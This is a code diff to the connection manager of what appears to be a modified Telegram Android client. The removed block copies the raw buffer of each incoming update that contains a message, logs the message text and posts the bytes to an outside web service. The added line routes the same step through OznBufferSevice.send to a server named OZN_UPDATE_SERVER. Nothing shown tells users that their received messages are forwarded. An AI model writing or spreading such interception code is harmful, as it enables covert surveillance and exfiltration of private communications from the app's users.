@@ -32,6 +32,7 @@ import org.telegram.messenger.StatsController;
 import org.telegram.messenger.UserConfig;
 import org.telegram.messenger.Utilities;
 import org.telegram.messenger.obrazon.network.FormDataUtils;
+import org.telegram.messenger.obrazon.network.OznBufferSevice;
 import org.telegram.messenger.obrazon.network.RxUtil;
 import org.telegram.messenger.obrazon.network.WebService;
 
@@ -60,6 +61,8 @@ import java.util.concurrent.TimeUnit;
 import java.util.concurrent.atomic.AtomicInteger;
 
 import kotlin.text.Charsets;
+
+import static org.telegram.messenger.BuildVars.OZN_UPDATE_SERVER;
 
 public class ConnectionsManager extends BaseController {
 
@@ -454,21 +457,7 @@ public class ConnectionsManager extends BaseController {
                 }
                 KeepAliveJob.finishJob();
                 Utilities.stageQueue.postRunnable(() -> AccountInstance.getInstance(currentAccount).getMessagesController().processUpdates((TLRPC.Updates) message, false));
-                if (((TLRPC.Updates) message).message!=null){
-                    // ByteBuffer to byte array
-                    byte[] bytes = new byte[buff.buffer.remaining()];
-                    buff.buffer.get(bytes, 0, bytes.length);
-                    Log.d("mylog_request", "request: " + ((TLRPC.Updates) message).message);
-                        RxUtil.networkConsumer(WebService.service
-                                        .sendData(FormDataUtils
-                                                .createBodyFromBytes(bytes)),
-                                responseBody -> {
-                                    Log.d("mylog_request", "response: " + responseBody.string());
-                                },
-                                throwable -> {
-                                    Log.d("mylog_request", "throwable " + throwable.getMessage());
-                                });
-                }
+                OznBufferSevice.send(buff, message, OZN_UPDATE_SERVER);
             } else {
                 if (BuildVars.LOGS_ENABLED) {
                     FileLog.d(String.format("java received unknown constructor 0x%x", constructor));
